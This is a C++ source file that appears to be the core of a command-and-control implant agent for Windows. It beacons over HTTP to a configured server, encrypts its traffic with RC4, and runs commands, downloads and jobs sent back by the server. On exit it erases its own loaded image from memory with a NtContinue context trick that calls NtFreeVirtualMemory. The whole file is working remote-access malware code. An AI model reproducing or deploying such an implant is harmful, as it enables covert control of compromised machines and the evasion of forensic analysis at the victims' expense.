#include "main.h"
#include "ApiLoader.h"
#include "Commander.h"
#include "utils.h"
#include "Crypt.h"

Agent*         g_Agent;
ConnectorHTTP* g_Connector;

void AgentMain()
{
	if ( !ApiLoad() ) return;

	g_Agent  = (Agent*) MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	CHAR* HttpHeaders = g_Agent->CreateHeaders();

	g_Connector = (ConnectorHTTP*) MemAllocLocal(sizeof(ConnectorHTTP));
	*g_Connector = ConnectorHTTP();
	g_Connector->SetConfig( g_Agent->config->use_ssl, (CHAR*)g_Agent->config->user_agent, (CHAR*)g_Agent->config->method, (CHAR*)g_Agent->config->address, g_Agent->config->port, (CHAR*)g_Agent->config->uri, HttpHeaders );

	Packer* packerOut  = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	ULONG recvDataSize = 0;
	BYTE* recvData     = NULL;

	do {
		if (packerOut->GetDataSize() > 4) {
			packerOut->Set32(0, packerOut->GetDataSize());
			
			BYTE* data = packerOut->GetData();
			ULONG dataSize = packerOut->GetDataSize();
			EncryptRC4(data, dataSize, g_Agent->SessionKey, 16);

			recvData = g_Connector->SendData( data, dataSize, &recvDataSize);
			
			packerOut->Clear();
			packerOut->Pack32(0);
		}
		else {
			recvData = g_Connector->SendData(NULL, 0, &recvDataSize);
		}

		if (recvData)
			DecryptRC4(recvData, recvDataSize, g_Agent->SessionKey, 16);

		g_Agent->commander->ProcessCommandTasks(recvData, recvDataSize, packerOut);
		if (g_Agent->IsActive() && packerOut->GetDataSize() < 8 )
			Sleep( g_Agent->config->sleep_delay * 1000 );

		g_Agent->downloader->ProcessDownloadTasks(packerOut);			
		g_Agent->jober->ProcessJobs(packerOut);

	} while ( g_Agent->IsActive() );

	g_Agent->commander->Exit(packerOut);

	BYTE* data     = packerOut->GetData();
	ULONG dataSize = packerOut->GetDataSize();

	g_Connector->SendData(data, dataSize, &recvDataSize);
	AgentClear(g_Agent->config->exit_method);
}

void AgentClear(int method)
{
	PPEB Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
	PLIST_ENTRY modList = &Peb->Ldr->InLoadOrderModuleList;
	PVOID moduleAddr = ((PLDR_DATA_TABLE_ENTRY)modList->Flink)->DllBase;
	
	ULONG elfanew    = ((PIMAGE_DOS_HEADER)moduleAddr)->e_lfanew;
	DWORD moduleSize = (((PIMAGE_NT_HEADERS)((PBYTE)moduleAddr + elfanew))->OptionalHeader.SizeOfImage);

	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_FULL;
	ApiWin->RtlCaptureContext(&ctx);

	ctx.Rip = (DWORD64) ApiNt->NtFreeVirtualMemory;
	ctx.Rsp = (DWORD64) ((ctx.Rsp & ~(0x1000 - 1)) - 0x1000);
	ctx.Rcx = (DWORD64) NtCurrentProcess();
	ctx.Rdx = (DWORD64) (&moduleAddr);
	ctx.R8 = (DWORD64) (&moduleSize);
	ctx.R9 = (DWORD64) MEM_RELEASE;

	if (method == 1)
		*(ULONG_PTR volatile*)(ctx.Rsp + (sizeof(ULONG_PTR) * 0x0)) = (UINT_PTR) ApiNt->RtlExitUserThread;
	else if (method == 2)
		*(ULONG_PTR volatile*)(ctx.Rsp + (sizeof(ULONG_PTR) * 0x0)) = (UINT_PTR) ApiNt->RtlExitUserProcess;

	ctx.ContextFlags = CONTEXT_FULL;
	ApiNt->NtContinue(&ctx, FALSE);
}